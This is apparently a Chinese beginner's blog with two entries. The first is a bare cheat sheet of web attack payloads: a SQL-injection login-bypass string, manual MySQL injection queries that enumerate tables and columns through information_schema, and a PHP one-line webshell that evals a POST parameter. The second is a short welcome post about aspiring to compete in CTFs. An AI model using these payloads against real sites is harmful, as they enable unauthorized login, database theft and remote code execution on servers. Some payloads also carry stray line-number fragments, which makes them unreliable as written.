entry.title: 菜鸟初学web
entry.content: 密码绕过漏洞:11' or 1=1 '1 mysql手工注入:123select table_name from information_schema.tables where table_schema="";select column_name from information_schema.columns where table_name=""; php一句话木马:123<?php @eval($_POST[ 'pass' ]);?>"?><?php @eval($_POST[ 'pass' ]);?><?php#

entry.title: Welcome to my blog.
entry.content: 学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！
